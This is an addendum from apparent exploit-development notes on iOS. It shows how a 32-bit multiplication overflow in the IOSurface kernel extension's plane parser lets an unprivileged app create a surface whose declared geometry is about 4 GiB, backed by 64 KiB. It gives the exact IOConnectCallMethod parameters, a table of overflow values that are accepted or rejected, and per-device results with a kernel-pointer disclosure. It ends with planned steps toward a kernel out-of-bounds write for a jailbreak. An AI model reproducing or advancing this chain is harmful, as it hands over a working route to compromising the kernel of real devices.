
---

## 11. Addendum 2026-11-12 — the direct route works: the scalar input must be 0

`tools/opencode-temp/ContentView-v119.swift` (mode `--geom`), run on the 13 Pro and
then the 17 Pro.  The call is the A16/F1 shape, unchanged:

```
IOConnectCallMethod(conn, /*sel*/ 0,
                    scalars = { 0 },        // <-- ONE scalar, value 0
                    inputStruct  = <NUL-terminated XML property list>,
                    inputStructCnt = 1750,
                    outputStruct = 0xc68 bytes, outputStructCnt = 0xc68)
```

The **only** difference from the failed v5-v7 matrix is the value of the single
scalar input.  `scalar = len`, `scalar = 1` and "no scalars" all still return
`0xe00002c2`; `scalar = 0` returns `OK` and fills the descriptor.

### 11.1 Control matrix (the test v5-v7 never ran)

The kernel's plane parser validates `(dataPerSlice + headerPerSlice) * sliceCount`
**in 32 bits** (`0xa32ccf8`) and compares the **wrapped** product against the
allocation, while storing the full 32-bit `headerPerSlice` (`0xa32cd94`).  So a
surface whose declared geometry is ~4 GiB can be backed by 64 KiB.  The
distinguishing test is therefore not "is it accepted" but "**is the
non-wrapping case rejected?**" — that is what proves the parser is live.

Same payload, only the per-slice values differ:

| case | header | data | sliceCount | alloc | result |
|---|---|---|---|---|---|
| A | `0x40000000` | `0x4000` | 4 | `0x10000` | **OK** — product wraps to `0x10000` <= alloc |
| B | `0x4000` | `0x4000` | 4 | `0x10000` | `0xe00002c2` — product `0x20000` > alloc, **rejected** |
| C | (no per-slice keys) | `0x4000` | 4 | `0x10000` | `0xe00002c2` — "must be present for multi-slice plane" |
| D | `0x40000000` | `0x40000000` | 4 | `0x10000` | **OK** — product wraps to 0 |
| E | `0x10000000` | `0x10000000` | 1 | `0x10000` | `0xe00002c2` — no wrap, too big |

**B and E are the control.**  If the parser were not running, they would have
been accepted like A and D.  They are rejected, so the parser runs, and A/D are
accepted only because the 32-bit multiply wraps.  (C shows the per-slice block
is additionally gated on `IOSurfacePlaneCompressedTileHeaderRegionOffset` and
`...CompressedTileDataRegionOffset`, exactly as §7.2 predicted.)

### 11.2 Both target devices

```
13 Pro  24A5390f (iOS 27.0)    A -> OK base=0x104e7c000 id=16 alloc=0x10000 planes=1
                              D -> OK base=0x104ea8000 id=18 alloc=0x10000 planes=1
                              B/C/E -> 0xe00002c2
17 Pro  24A446  (iOS 27.0.1)  A -> OK base=0x10181c000 id=87 alloc=0x10000 planes=1
                              D -> OK base=0x106188000 id=82 alloc=0x10000 planes=1
                              B/C/E -> 0xe00002c2
```

The descriptor matches the A16/27.3beta F1 transcript **byte for byte** (same
field offsets, same `04 00 01 01` at `+0x60`, same `ARGB` fourcc at `+0x48`),
and the kernel backing pointer is disclosed at `+0x00` — the same unprivileged
kernel-pointer disclosure the F1 transcript relied on.

### 11.3 What this unlocks, and what is still missing

The size-confusion **primitive** is now reachable on both targets:

* a surface whose declared per-slice geometry is ~4 GiB while its backing
  store is 64 KiB, created by an ordinary sandboxed app;
* the kernel backing pointer of that surface, disclosed in the descriptor.

What is **not** yet demonstrated is the *consumer* of that geometry:

* the F1 route: bind the surface to Metal, let the GPU map it with the bogus
  size, and write past the end of the 64 KiB allocation into the neighbouring
  GPU allocation (`F1-PRIMITIVE-EVIDENCE.md` §3: `delta = ctrlga - figa`,
  `WRITE idx = 0x3a00` -> "CROSS-OBJECT HIT").  That is a **GPU-VA** write, not
  yet a kernel write;
* a possible kernel-side consumer: any kext path that trusts the stored
  per-slice values when it copies or maps plane data would be a **kernel**
  OOB, which is the primitive a jailbreak needs.

The next falsifiable step is to enumerate the consumers of the stored
`headerPerSlice` (`plane+0x38`) / `dataPerSlice` (`plane+0x34`) in
`com.apple.iokit.IOSurface` and in the GPU mapping path, then drive the one
that yields a kernel-side access.
